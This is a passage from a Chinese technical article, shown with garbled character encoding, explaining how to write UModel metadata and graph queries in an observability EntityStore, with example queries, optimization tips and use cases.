-- æŸ¥è¯¢æ‰€æœ‰èŠ‚ç‚¹ç±»å‹ï¼ˆå®ä½“å®šä¹‰ï¼‰
.umodel |Â <span class="hljs-built_in">where</span>Â __type__ =Â <span class="hljs-string">'node'</span>Â |Â <span class="hljs-built_in">limit</span>Â 0, 10
</code></pre>
<p>æŒ‰å±æ€§è¿‡æ»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">-- æŸ¥è¯¢ç‰¹å®šåç§°çš„å®ä½“å®šä¹‰
.umodel |Â <span class="hljs-built_in">where</span>Â json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>) =Â <span class="hljs-string">'acs.ecs.instance'</span>Â |Â <span class="hljs-built_in">limit</span>Â 0, 10
-- æŸ¥è¯¢ç‰¹å®šåŸŸçš„æ‰€æœ‰å®šä¹‰
.umodel |Â <span class="hljs-built_in">where</span>Â json_extract_scalar(metadata,Â <span class="hljs-string">'$.domain'</span>) =Â <span class="hljs-string">'apm'</span>Â |Â <span class="hljs-built_in">limit</span>Â 0, 10
-- æŸ¥è¯¢å¤šä¸ªåŸŸçš„å®šä¹‰
.umodel |Â <span class="hljs-built_in">where</span>Â json_extract_scalar(metadata,Â <span class="hljs-string">'$.domain'</span>)Â <span class="hljs-keyword">in</span>Â (<span class="hljs-string">'acs'</span>,Â <span class="hljs-string">'apm'</span>,Â <span class="hljs-string">'k8s'</span>) |Â <span class="hljs-built_in">limit</span>Â 0, 10
</code></pre>
<h5 data-id="heading-13">2. å›¾è®¡ç®—åœºæ™¯ - å…³ç³»åˆ†æ</h5>
<p>UModel æ”¯æŒåŸºäºå…ƒæ•°æ®çš„å›¾è®¡ç®—ï¼Œç”¨äºåˆ†æ EntitySet ä¹‹é—´çš„å…³ç³»ï¼š</p>
<p>åŸºç¡€å›¾æŸ¥è¯¢è¯­æ³•ï¼š</p>
<pre><code class="hljs language-lua" lang="lua">.umodel | graph-<span class="hljs-built_in">match</span>Â &lt;<span class="hljs-built_in">path</span>&gt;Â projectÂ &lt;<span class="hljs-built_in">output</span>&gt;
</code></pre>
<p>åŸºç¡€æ¦‚å¿µï¼š</p>
<p>åœ¨å›¾æŸ¥è¯¢ä¸­ï¼Œæœ‰ä¸¤ä¸ªå…³é”®æ€§çš„å›¾æ¦‚å¿µï¼š</p>
<p>èŠ‚ç‚¹ç±»å‹ï¼Œå³Â labelÂ ä¿¡æ¯ï¼Œåœ¨ UModel çš„å…ƒæ•°æ®å›¾æŸ¥è¯¢ä¸­ï¼Œä¸ºÂ <code>&lt;domain&gt;@&lt;kind&gt;</code>ï¼Œä¾‹å¦‚Â <code>apm@entity_set</code>
èŠ‚ç‚¹ IDï¼Œå³Â <code>__entity_id__</code>Â ä¿¡æ¯ï¼Œåœ¨ UModel çš„å…ƒæ•°æ®å›¾æŸ¥è¯¢ä¸­ï¼Œä¸ºÂ <code>kind::domain::name</code>ï¼Œä¾‹å¦‚Â <code>entity_set::apm::apm.service</code></p>
<p>å›¾æŸ¥è¯¢è·¯å¾„ï¼ˆPATHï¼‰ä½¿ç”¨ ASCII å­—ç¬¦æè¿°å…³ç³»æ–¹å‘ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/992db3f6a27d4e6bb3c9b1b89492762f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765787160&amp;x-signature=T09BDPNmUu3CZtxfjeZDsaTa4cE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æŸ¥è¯¢ EntitySet çš„é‚»å±…å…³ç³»ï¼š</p>
<pre><code class="hljs language-css" lang="css">-- æŸ¥è¯¢ç‰¹å®šEntitySetçš„æ‰€æœ‰å…³è”å…³ç³»
<span class="hljs-selector-class">.umodel</span>Â 
| graph-match (s:<span class="hljs-string">"acs@entity_set"</span>Â {__entity_id__:Â <span class="hljs-string">'entity_set::acs::acs.ecs.instance'</span>})
Â  Â  Â  Â  Â  Â  Â  -<span class="hljs-selector-attr">[e]</span>-(d)Â 
Â  project s, e, d |Â limitÂ <span class="hljs-number">0</span>, <span class="hljs-number">10</span>
</code></pre>
<p>æ–¹å‘æ€§å…³ç³»æŸ¥è¯¢ï¼š</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-comment">-- æŸ¥è¯¢æŒ‡å‘æŸä¸ªEntitySetçš„å…³ç³»</span>
.umodelÂ 
| graph-<span class="hljs-built_in">match</span> (s:<span class="hljs-string">"acs@entity_set"</span>Â {__entity_id__:Â <span class="hljs-string">'entity_set::acs::acs.ecs.instance'</span>})
Â  Â  Â  Â  Â  Â  Â  &lt;<span class="hljs-comment">--(d)Â </span>
Â  project s, d |Â limitÂ <span class="hljs-number">0</span>, <span class="hljs-number">10</span>
<span class="hljs-comment">-- æŸ¥è¯¢ä»æŸä¸ªEntitySetå‡ºå‘çš„å…³ç³» Â </span>
.umodelÂ 
| graph-<span class="hljs-built_in">match</span> (s:<span class="hljs-string">"acs@entity_set"</span>Â {__entity_id__:Â <span class="hljs-string">'entity_set::acs::acs.ack.cluster'</span>})
Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment">--&gt;(d)Â </span>
Â  project s, d |Â limitÂ <span class="hljs-number">0</span>, <span class="hljs-number">10</span>
</code></pre>
<h3 data-id="heading-14">2.3 é«˜çº§æŸ¥è¯¢åŠŸèƒ½</h3>
<h4 data-id="heading-15">JSON è·¯å¾„æå–</h4>
<p>ç”±äº UModel æ•°æ®é‡‡ç”¨ JSON ç»“æ„å­˜å‚¨ï¼Œéœ€è¦ä½¿ç”¨ JSON å‡½æ•°è¿›è¡Œå­—æ®µæå–ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">-- æå–åŸºç¡€ä¿¡æ¯
.umodelÂ 
| extendÂ 
Â  Â  <span class="hljs-attr">entity_name</span> = json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>),
Â  Â  <span class="hljs-attr">entity_domain</span> = json_extract_scalar(metadata,Â <span class="hljs-string">'$.domain'</span>),
Â  Â  <span class="hljs-attr">entity_description</span> = json_extract_scalar(metadata,Â <span class="hljs-string">'$.description.zh_cn'</span>)
| project entity_name, entity_domain, entity_description |Â limitÂ 0, 100
</code></pre>
<h4 data-id="heading-16">å¤æ‚æ¡ä»¶ç­›é€‰</h4>
<pre><code class="hljs language-java" lang="java">-- å¤šæ¡ä»¶ç»„åˆæŸ¥è¯¢
.umodelÂ 
|Â <span class="hljs-type">where</span>Â <span class="hljs-variable">kind</span>Â <span class="hljs-operator">=</span>Â <span class="hljs-string">'entity_set'</span>
Â  andÂ <span class="hljs-title function_">json_extract_scalar</span><span class="hljs-params">(metadata,Â <span class="hljs-string">'$.domain'</span>)</span>Â in (<span class="hljs-string">'apm'</span>,Â <span class="hljs-string">'k8s'</span>)
Â  andÂ <span class="hljs-title function_">json_array_length</span><span class="hljs-params">(json_extract(spec,Â <span class="hljs-string">'$.fields'</span>)</span>) &gt;Â <span class="hljs-number">5</span>
|Â <span class="hljs-type">extend</span>Â 
Â  Â Â <span class="hljs-variable">entity_name</span>Â <span class="hljs-operator">=</span>Â json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>),
Â  Â  field_count = json_array_length(json_extract(spec,Â <span class="hljs-string">'$.fields'</span>))
| sort field_count desc
| limitÂ <span class="hljs-number">20</span>
</code></pre>
<h4 data-id="heading-17">èšåˆåˆ†æ</h4>
<pre><code class="hljs language-ini" lang="ini">-- æŒ‰åŸŸç»Ÿè®¡EntitySetæ•°é‡
.umodelÂ 
|Â whereÂ <span class="hljs-attr">kind</span>Â =Â <span class="hljs-string">'entity_set'</span>
|Â extend <span class="hljs-attr">domain</span>Â =Â json_extract_scalar(metadata,Â <span class="hljs-string">'$.domain'</span>)
|Â stats <span class="hljs-attr">entity_count</span>Â =Â count()Â byÂ domain
|Â sort entity_countÂ desc
</code></pre>
<h3 data-id="heading-18">2.4 æ€§èƒ½ä¼˜åŒ–å»ºè®®</h3>
<h4 data-id="heading-19">ä½¿ç”¨ç²¾ç¡®è¿‡æ»¤</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- ä¼˜åŒ–å‰ï¼šèŒƒå›´è¿‡å¤§</span>
.umodelÂ <span class="hljs-operator">|</span>Â <span class="hljs-keyword">where</span>Â json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>)Â <span class="hljs-keyword">like</span>Â <span class="hljs-string">'%service%'</span>
<span class="hljs-comment">-- ä¼˜åŒ–åï¼šç²¾ç¡®åŒ¹é…</span>
.umodelÂ <span class="hljs-operator">|</span>Â <span class="hljs-keyword">where</span>Â kindÂ <span class="hljs-operator">=</span>Â <span class="hljs-string">'entity_set'</span>Â 
Â Â <span class="hljs-keyword">and</span>Â json_extract_scalar(metadata,Â <span class="hljs-string">'$.domain'</span>)Â <span class="hljs-operator">=</span>Â <span class="hljs-string">'apm'</span>
Â Â <span class="hljs-keyword">and</span>Â json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>)Â <span class="hljs-operator">=</span>Â <span class="hljs-string">'apm.service'</span>
</code></pre>
<h4 data-id="heading-20">è¿‡æ»¤å‰ç½®</h4>
<pre><code class="hljs language-ini" lang="ini">-- ä¼˜åŒ–å‰ï¼šåæœŸè¿‡æ»¤
.umodelÂ 
|Â extendÂ <span class="hljs-attr">name</span>Â =Â json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>)
|Â whereÂ <span class="hljs-attr">name</span>Â =Â <span class="hljs-string">'apm.service'</span>
-- ä¼˜åŒ–åï¼šè¿‡æ»¤å‰ç½®
.umodelÂ 
| whereÂ json_extract_scalar(metadata,Â '$.name')Â =Â 'apm.service'
|Â extendÂ <span class="hljs-attr">name</span>Â =Â json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>)
</code></pre>
<h4 data-id="heading-21">å›¾æŸ¥è¯¢ä¼˜åŒ–</h4>
<pre><code class="hljs language-scss" lang="scss">-- ä¼˜åŒ–å‰ï¼šå…¨å›¾æœç´¢
<span class="hljs-selector-class">.umodel</span> | graph-matchÂ (s)-<span class="hljs-selector-attr">[e]</span><span class="hljs-built_in">-</span>(d) project s, e, d
-- ä¼˜åŒ–åï¼šæŒ‡å®šèµ·å§‹ç‚¹
<span class="hljs-selector-class">.umodel</span>Â 
| graph-matchÂ (s:"apm@entity_set"Â {__entity_id__:Â 'entity_set::apm::apm.service'})
Â  Â  Â  Â  Â  Â  Â  -<span class="hljs-selector-attr">[e]</span><span class="hljs-built_in">-</span>(d)Â 
Â  project s, e, d
</code></pre>
<h2 data-id="heading-22">UModel æŸ¥è¯¢å…·ä½“åº”ç”¨åœºæ™¯</h2>
<p>UModel æŸ¥è¯¢åœ¨å®é™…åº”ç”¨ä¸­èƒ½å¤Ÿè§£å†³å¤šç§åœºæ™¯ä¸‹çš„é—®é¢˜ï¼Œä¸ºæ•°æ®å»ºæ¨¡ã€Schema ç®¡ç†å’ŒçŸ¥è¯†å›¾è°±åˆ†ææä¾›å¼ºå¤§æ”¯æŒã€‚</p>
<h3 data-id="heading-23">3.1 Schema æ¢ç´¢ä¸å‘ç°</h3>
<h4 data-id="heading-24">åœºæ™¯æè¿°</h4>
<p>åœ¨å¤§å‹å¯è§‚æµ‹æ€§ç³»ç»Ÿä¸­ï¼Œå¯èƒ½å­˜åœ¨æ•°ç™¾ä¸ª EntitySet å®šä¹‰ï¼Œåˆ†å¸ƒåœ¨ä¸åŒçš„åŸŸï¼ˆdomainï¼‰ä¸­ã€‚ç”¨æˆ·éœ€è¦å¿«é€Ÿäº†è§£ç³»ç»Ÿä¸­å®šä¹‰äº†å“ªäº›å®ä½“ç±»å‹ï¼Œä»¥åŠå®ƒä»¬çš„åŸºæœ¬ä¿¡æ¯ã€‚</p>
<h4 data-id="heading-25">åº”ç”¨ç¤ºä¾‹</h4>
<p>æ¢ç´¢æ‰€æœ‰å®ä½“ç±»å‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">-- åˆ—å‡ºæ‰€æœ‰EntitySetåŠå…¶åŸºæœ¬ä¿¡æ¯
.umodelÂ 
|Â whereÂ <span class="hljs-attr">kind</span> =Â <span class="hljs-string">'entity_set'</span>
| extendÂ 
Â  Â  <span class="hljs-attr">entity_name</span> = json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>),
Â  Â  <span class="hljs-attr">entity_domain</span> = json_extract_scalar(metadata,Â <span class="hljs-string">'$.domain'</span>),
Â  Â  <span class="hljs-attr">description</span> = json_extract_scalar(metadata,Â <span class="hljs-string">'$.description.zh_cn'</span>)
| project entity_name, entity_domain, description
|Â sortÂ entity_domain, entity_name
|Â limitÂ 0, 100
</code></pre>
<p>æŒ‰åŸŸåˆ†ç±»æŸ¥çœ‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">-- æŸ¥çœ‹ç‰¹å®šåŸŸï¼ˆå¦‚APMï¼‰ä¸‹çš„æ‰€æœ‰å®ä½“å®šä¹‰
.umodelÂ 
|Â whereÂ <span class="hljs-attr">kind</span>Â =Â <span class="hljs-string">'entity_set'</span>Â 
Â  andÂ json_extract_scalar(metadata,Â '$.domain')Â =Â 'apm'
|Â extendÂ 
Â  Â Â <span class="hljs-attr">entity_name</span>Â =Â json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>),
Â  Â  <span class="hljs-attr">description</span> = json_extract_scalar(metadata,Â <span class="hljs-string">'$.short_description.zh_cn'</span>)
| project entity_name, description
| limitÂ 0,Â 50
</code></pre>
<h3 data-id="heading-26">3.2 æ•°æ®å»ºæ¨¡åˆ†æ</h3>
<h4 data-id="heading-27">åœºæ™¯æè¿°</h4>
<p>åœ¨è¿›è¡Œæ•°æ®å»ºæ¨¡ä¼˜åŒ–æ—¶ï¼Œéœ€è¦åˆ†æç°æœ‰ EntitySet çš„å­—æ®µå¤æ‚åº¦ã€ä¸»é”®è®¾è®¡ã€ç´¢å¼•é…ç½®ç­‰ä¿¡æ¯ï¼Œä»¥ä¾¿è¯†åˆ«éœ€è¦ä¼˜åŒ–çš„æ¨¡å‹ã€‚</p>
<h4 data-id="heading-28">åº”ç”¨ç¤ºä¾‹</h4>
<p>åˆ†æå­—æ®µå¤æ‚åº¦ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">-- åˆ†æå„åŸŸä¸‹EntitySetçš„å­—æ®µæ•°é‡åˆ†å¸ƒ
.umodelÂ 
|Â whereÂ <span class="hljs-attr">kind</span>Â =Â <span class="hljs-string">'entity_set'</span>
|Â extendÂ 
Â  Â  <span class="hljs-attr">domain</span>Â =Â json_extract_scalar(metadata,Â <span class="hljs-string">'$.domain'</span>),
Â  Â  <span class="hljs-attr">entity_name</span>Â =Â json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>),
Â  Â  <span class="hljs-attr">field_count</span>Â =Â json_array_length(json_extract(spec,Â <span class="hljs-string">'$.fields'</span>))
|Â statsÂ 
Â  Â  <span class="hljs-attr">avg_fields</span>Â =Â avg(field_count),
Â  Â  <span class="hljs-attr">max_fields</span>Â =Â max(field_count),
Â  Â  <span class="hljs-attr">min_fields</span>Â =Â min(field_count),
Â  Â  <span class="hljs-attr">entity_count</span>Â =Â count()
Â Â byÂ domain
|Â sort entity_countÂ desc
</code></pre>
<p>æŸ¥æ‰¾å¤æ‚å®ä½“ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">-- æ‰¾å‡ºå­—æ®µæ•°é‡æœ€å¤šçš„EntitySetï¼ˆå¯èƒ½éœ€è¦ä¼˜åŒ–ï¼‰
.umodelÂ 
|Â whereÂ <span class="hljs-attr">kind</span> =Â <span class="hljs-string">'entity_set'</span>
| extendÂ 
Â  Â  <span class="hljs-attr">entity_name</span> = json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>),
Â  Â  <span class="hljs-attr">domain</span> = json_extract_scalar(metadata,Â <span class="hljs-string">'$.domain'</span>),
Â  Â  <span class="hljs-attr">field_count</span> = json_array_length(json_extract(spec,Â <span class="hljs-string">'$.fields'</span>))
|Â sortÂ field_count desc
|Â limitÂ 20
</code></pre>
<h3 data-id="heading-29">3.3 å…³ç³»å›¾è°±åˆ†æ</h3>
<h4 data-id="heading-30">åœºæ™¯æè¿°</h4>
<p>ç†è§£ EntitySet ä¹‹é—´çš„å…³ç³»å¯¹äºæ„å»ºå®Œæ•´çš„çŸ¥è¯†å›¾è°±è‡³å…³é‡è¦ã€‚é€šè¿‡å›¾æŸ¥è¯¢å¯ä»¥åˆ†æå®ä½“é—´çš„å…³è”å…³ç³»ï¼Œå‘ç°æ•°æ®æ¨¡å‹ä¸­çš„ä¾èµ–å’Œè¿æ¥ã€‚</p>
<h4 data-id="heading-31">åº”ç”¨ç¤ºä¾‹</h4>
<p>æŸ¥è¯¢å®ä½“çš„æ‰€æœ‰å…³è”å…³ç³»ï¼š</p>
<pre><code class="hljs language-css" lang="css">-- æŸ¥è¯¢æŸä¸ªEntitySetï¼ˆå¦‚apm<span class="hljs-selector-class">.service</span>ï¼‰çš„æ‰€æœ‰å…³è”å…³ç³»
<span class="hljs-selector-class">.umodel</span>Â 
| graph-match (s:<span class="hljs-string">"apm@entity_set"</span>Â {__entity_id__:Â <span class="hljs-string">'entity_set::apm::apm.service'</span>})
Â  Â  Â  Â  Â  Â  Â  -<span class="hljs-selector-attr">[e]</span>-(d)Â 
Â  project s, e, d
|Â limitÂ <span class="hljs-number">0</span>, <span class="hljs-number">50</span>
</code></pre>
<p>åˆ†æå…³ç³»ç±»å‹åˆ†å¸ƒï¼š</p>
<pre><code class="hljs language-ini" lang="ini">-- ç»Ÿè®¡ä¸åŒå…³ç³»ç±»å‹çš„æ•°é‡
.umodelÂ 
|Â whereÂ <span class="hljs-attr">kind</span>Â =Â <span class="hljs-string">'entity_set_link'</span>
|Â extendÂ 
Â  Â  <span class="hljs-attr">link_name</span>Â =Â json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>),
Â  Â  <span class="hljs-attr">link_type</span>Â =Â json_extract_scalar(metadata,Â <span class="hljs-string">'$.link_type'</span>)
|Â stats <span class="hljs-attr">limk_count</span>Â =Â count()Â byÂ link_type
|Â sort limk_countÂ desc
</code></pre>
<p>æŸ¥æ‰¾ç‰¹å®šå…³ç³»ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">-- æŸ¥æ‰¾æ‰€æœ‰"runs_on"ç±»å‹çš„å…³ç³»å®šä¹‰
.umodelÂ 
|Â whereÂ <span class="hljs-attr">kind</span> =Â <span class="hljs-string">'entity_set_link'</span>
Â  and json_extract_scalar(metadata,Â '$.link_type') =Â 'runs_on'
| extendÂ 
Â  Â  <span class="hljs-attr">link_name</span> = json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>),
Â  Â Â <span class="hljs-attr">source</span>Â = json_extract_scalar(metadata,Â <span class="hljs-string">'$.source'</span>),
Â  Â  <span class="hljs-attr">target</span> = json_extract_scalar(metadata,Â <span class="hljs-string">'$.target'</span>)
| project link_name,Â source, target
</code></pre>
<h3 data-id="heading-32">3.4 å…ƒæ•°æ®è´¨é‡æ£€æŸ¥</h3>
<h4 data-id="heading-33">åœºæ™¯æè¿°</h4>
<p>ç¡®ä¿ UModel å…ƒæ•°æ®çš„å®Œæ•´æ€§å’Œä¸€è‡´æ€§ï¼Œæ£€æŸ¥ç¼ºå¤±çš„æè¿°ã€æœªå®šä¹‰çš„å­—æ®µç­‰é—®é¢˜ã€‚</p>
<h4 data-id="heading-34">åº”ç”¨ç¤ºä¾‹</h4>
<p>æ£€æŸ¥ç¼ºå¤±æè¿°çš„ EntitySetï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">-- æ‰¾å‡ºæ²¡æœ‰ä¸­æ–‡æè¿°çš„EntitySet
.umodelÂ 
|Â <span class="hljs-keyword">where</span>Â kind =Â <span class="hljs-string">'entity_set'</span>
Â Â <span class="hljs-keyword">and</span>Â (json_extract_scalar(metadata,Â <span class="hljs-string">'$.description.zh_cn'</span>) =Â <span class="hljs-string">''</span>Â 
Â  Â  Â  Â <span class="hljs-function"><span class="hljs-keyword">or</span>Â <span class="hljs-title">json_extract_scalar</span>(<span class="hljs-params">metadata,Â <span class="hljs-string">'$.description.zh_cn'</span></span>)Â <span class="hljs-keyword">is</span>Â <span class="hljs-literal">null</span>)
| extendÂ 
Â  Â  entity_name</span> = json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>),
Â  Â  domain = json_extract_scalar(metadata,Â <span class="hljs-string">'$.domain'</span>)
| project entity_name, domain
</code></pre>
<p>éªŒè¯å­—æ®µå®šä¹‰å®Œæ•´æ€§ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">-- æ£€æŸ¥æ²¡æœ‰å®šä¹‰å­—æ®µçš„EntitySet
.umodelÂ 
|Â <span class="hljs-keyword">where</span>Â kind =Â <span class="hljs-string">'entity_set'</span>
Â Â <span class="hljs-keyword">and</span>Â (json_extract(spec,Â <span class="hljs-string">'$.fields'</span>)Â <span class="hljs-function"><span class="hljs-keyword">is</span>Â <span class="hljs-literal">null</span>Â 
Â  Â  Â  Â <span class="hljs-keyword">or</span>Â <span class="hljs-title">json_array_length</span>(<span class="hljs-params">json_extract(spec,Â <span class="hljs-string">'$.fields'</span></span>))</span> =Â <span class="hljs-number">0</span>)
| extendÂ 
Â  Â  entity_name = json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>),
Â  Â  domain = json_extract_scalar(metadata,Â <span class="hljs-string">'$.domain'</span>)
| project entity_name, domain
</code></pre>
<h3 data-id="heading-35">3.5 è·¨åŸŸå…³è”åˆ†æ</h3>
<h4 data-id="heading-36">åœºæ™¯æè¿°</h4>
<p>åœ¨å¤æ‚çš„å¯è§‚æµ‹æ€§ç³»ç»Ÿä¸­ï¼Œä¸åŒåŸŸï¼ˆå¦‚ APMã€K8sã€äº‘èµ„æºï¼‰çš„å®ä½“å¯èƒ½å­˜åœ¨å…³è”å…³ç³»ã€‚é€šè¿‡ UModel æŸ¥è¯¢å¯ä»¥åˆ†æè¿™äº›è·¨åŸŸçš„å…³è”æ¨¡å¼ã€‚</p>
<h4 data-id="heading-37">åº”ç”¨ç¤ºä¾‹</h4>
<p>æŸ¥æ‰¾è·¨åŸŸå…³ç³»ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">-- æŸ¥æ‰¾è¿æ¥ä¸åŒåŸŸçš„EntitySetLink
.umodelÂ 
|Â whereÂ <span class="hljs-attr">kind</span> =Â <span class="hljs-string">'entity_set_link'</span>
| extendÂ 
Â  Â  <span class="hljs-attr">link_name</span> = json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>),
Â  Â  <span class="hljs-attr">source_domain</span> = json_extract_scalar(spec,Â <span class="hljs-string">'$.src.domain'</span>),
Â  Â  <span class="hljs-attr">target_domain</span> = json_extract_scalar(spec,Â <span class="hljs-string">'$.dest.domain'</span>)
|Â whereÂ source_domain != target_domain
| project link_name, source_domain, target_domain
|Â limitÂ 0, 50
</code></pre>
<p>åˆ†æåŸŸé—´è¿æ¥åº¦ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">-- ç»Ÿè®¡å„åŸŸä¹‹é—´çš„è¿æ¥å…³ç³»æ•°é‡
.umodelÂ 
|Â whereÂ <span class="hljs-attr">kind</span>Â =Â <span class="hljs-string">'entity_set_link'</span>
|Â extendÂ 
Â  Â  <span class="hljs-attr">source_domain</span>Â =Â json_extract_scalar(spec,Â <span class="hljs-string">'$.src.domain'</span>),
Â  Â  <span class="hljs-attr">target_domain</span>Â =Â json_extract_scalar(spec,Â <span class="hljs-string">'$.dest.domain'</span>)
|Â stats <span class="hljs-attr">count</span>Â =Â count()Â byÂ source_domain, target_domain
|Â sort countÂ desc
</code></pre>
<h3 data-id="heading-38">3.6 ç‰ˆæœ¬ä¸æ¼”è¿›åˆ†æ</h3>
<h4 data-id="heading-39">åœºæ™¯æè¿°</h4>
<p>UModel Schema ä¼šéšç€ä¸šåŠ¡å‘å±•è€Œæ¼”è¿›ï¼Œéœ€è¦è·Ÿè¸ª Schema çš„ç‰ˆæœ¬å˜åŒ–å’Œæ¼”è¿›å†å²ã€‚</p>
<h4 data-id="heading-40">åº”ç”¨ç¤ºä¾‹</h4>
<p>æŸ¥çœ‹ Schema ç‰ˆæœ¬ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">-- æŸ¥çœ‹æ‰€æœ‰EntitySetçš„Schemaç‰ˆæœ¬
.umodelÂ 
|Â whereÂ <span class="hljs-attr">kind</span> =Â <span class="hljs-string">'entity_set'</span>
| extendÂ 
Â  Â  <span class="hljs-attr">entity_name</span> = json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>),
Â  Â  <span class="hljs-attr">schema_version</span> = json_extract_scalar(schema,Â <span class="hljs-string">'$.version'</span>),
Â  Â  <span class="hljs-attr">schema_url</span> = json_extract_scalar(schema,Â <span class="hljs-string">'$.url'</span>)
| project entity_name, schema_version, schema_url
|Â limitÂ 0, 100
</code></pre>
<h3 data-id="heading-41">3.7 å¿«é€Ÿå®šä½ä¸æ£€ç´¢</h3>
<h4 data-id="heading-42">åœºæ™¯æè¿°</h4>
<p>åœ¨å¤§é‡å…ƒæ•°æ®ä¸­å¿«é€Ÿæ‰¾åˆ°ç‰¹å®šçš„ EntitySet æˆ–å…³ç³»å®šä¹‰ï¼Œæ”¯æŒæ¨¡ç³ŠåŒ¹é…å’Œç²¾ç¡®æŸ¥è¯¢ã€‚</p>
<h4 data-id="heading-43">åº”ç”¨ç¤ºä¾‹</h4>
<p>æŒ‰åç§°æ¨¡ç³Šæœç´¢ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">-- æœç´¢åŒ…å«"service"çš„EntitySet
.umodelÂ 
|Â whereÂ <span class="hljs-attr">kind</span>Â =Â <span class="hljs-string">'entity_set'</span>
Â  andÂ json_extract_scalar(metadata,Â '$.name')Â likeÂ '%service%'
|Â extendÂ 
Â  Â Â <span class="hljs-attr">entity_name</span>Â =Â json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>),
Â  Â  <span class="hljs-attr">domain</span> = json_extract_scalar(metadata,Â <span class="hljs-string">'$.domain'</span>)
| project entity_name, domain
| limitÂ 0,Â 20
</code></pre>
<p>ç²¾ç¡®æŸ¥æ‰¾ç‰¹å®šå®ä½“ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">-- ç²¾ç¡®æŸ¥æ‰¾ç‰¹å®šEntitySetçš„å®Œæ•´å®šä¹‰
.umodelÂ 
|Â <span class="hljs-built_in">where</span>Â json_extract_scalar(metadata,Â <span class="hljs-string">'$.name'</span>) =Â <span class="hljs-string">'apm.service'</span>
|Â <span class="hljs-built_in">limit</span>Â 1
</code></pre>
<h2 data-id="heading-44">æ€»ç»“</h2>
<p>UModel æŸ¥è¯¢ä½œä¸º EntityStore ä¸­ä¸“é—¨ç”¨äºæŸ¥è¯¢çŸ¥è¯†å›¾è°±å…ƒæ•°æ®çš„æ¥å£ï¼Œä¸ºå¯è§‚æµ‹æ€§æ•°æ®å»ºæ¨¡æä¾›äº†å¼ºå¤§çš„æ”¯æŒèƒ½åŠ›ã€‚é€šè¿‡ UModel æŸ¥è¯¢å¯ä»¥ï¼š</p>
<ol>
<li>æ¢ç´¢ Schema ç»“æ„ï¼šå¿«é€Ÿäº†è§£ç³»ç»Ÿä¸­å®šä¹‰çš„æ‰€æœ‰å®ä½“ç±»å‹å’Œå…³ç³»ç±»å‹</li>
<li>åˆ†ææ•°æ®æ¨¡å‹ï¼šæ·±å…¥åˆ†æ EntitySet çš„å­—æ®µè®¾è®¡ã€ä¸»é”®é…ç½®ã€å¤æ‚åº¦ç­‰</li>
<li>æ„å»ºå…³ç³»å›¾è°±ï¼šé€šè¿‡å›¾æŸ¥è¯¢åˆ†æå®ä½“é—´çš„å…³è”å…³ç³»ï¼Œç†è§£çŸ¥è¯†å›¾è°±çš„æ‹“æ‰‘ç»“æ„</li>
<li>è´¨é‡æ£€æŸ¥ï¼šéªŒè¯å…ƒæ•°æ®çš„å®Œæ•´æ€§å’Œä¸€è‡´æ€§</li>
<li>è·¨åŸŸåˆ†æï¼šåˆ†æä¸åŒåŸŸä¹‹é—´çš„å…³è”æ¨¡å¼</li>
<li>å¿«é€Ÿæ£€ç´¢ï¼šåœ¨å¤§é‡å…ƒæ•°æ®ä¸­å¿«é€Ÿå®šä½ç›®æ ‡å®šä¹‰</li>
</ol>
<p>è¿™äº›èƒ½åŠ›ä½¿å¾— UModel æŸ¥è¯¢æˆä¸ºæ•°æ®å»ºæ¨¡åˆ†æã€Schema ç®¡ç†å’ŒçŸ¥è¯†å›¾è°±æ¢ç´¢çš„ä¸å¯æˆ–ç¼ºçš„å·¥å…·ï¼Œä¸ºæ„å»ºå’Œç»´æŠ¤é«˜è´¨é‡çš„å¯è§‚æµ‹æ€§æ•°æ®æ¨¡å‹æä¾›äº†åšå®çš„åŸºç¡€ã€‚</p>
